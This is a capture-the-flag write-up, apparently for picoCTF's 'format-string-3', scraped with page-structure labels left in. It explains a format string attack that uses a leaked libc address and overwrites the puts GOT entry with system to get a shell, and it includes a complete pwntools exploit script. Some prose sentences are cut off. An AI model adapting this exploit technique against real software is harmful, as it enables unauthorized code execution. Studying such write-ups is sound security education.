description: Format string attack modifying GOT to run custom function after memory address leak.

children.value: Format string attack modifying GOT to run custom function after memory address leak.
We can find the location of our format string in memory using

props.code:
from pwn import *

elf = context.binary = ELF('./format-string-3')


def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
info("offset = %d", offset)
props.className: language-python shiki shiki-themes one-light one-dark-pro monokai

children.value: we can find the functions related to the challenge.

we have to do address leak first.
Luckily the author already does that for us.

props.code:
p = process(program)
# p = remote('rhea.picoctf.net', 50248)
p.recvuntil(b': 0x')
setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)
libc = ELF("./libc.so")
libc.address = setvbuf_leak - libc.symbols['setvbuf']  # normalizing libc base address
sys_addr = libc.symbols['system']

ELFs store symbol-address map in GOT (Global Offset Table).
We can modify the GOT entry of

props.code:
sys_addr = libc.symbols['system']
puts_addr = elf.got['puts']
writes = {puts_addr: sys_addr}

payload = fmtstr_payload(offset, writes)
p.sendline(payload)
props.className: language-python shiki shiki-themes one-light one-dark-pro monokai

children.value: And that's it, we have shell access.

props.className: language-flag shiki shiki-themes one-light one-dark-pro monokai

props.code:
from pwn import *

elf = context.binary = ELF('./format-string-3')


def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
info("offset = %d", offset)

p = elf.process()
# p = remote('rhea.picoctf.net', 50248)

p.recvuntil(b': 0x')
setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)

libc = ELF("./libc.so.6")
libc.address = setvbuf_leak - libc.symbols['setvbuf']  # normalizing libc base address

sys_addr = libc.symbols['system']
puts_addr = elf.got['puts']
writes = {puts_addr: sys_addr}

payload = fmtstr_payload(offset, writes)
p.sendline(payload)
p.interactive()
props.className: language-python shiki shiki-themes one-light one-dark-pro monokai
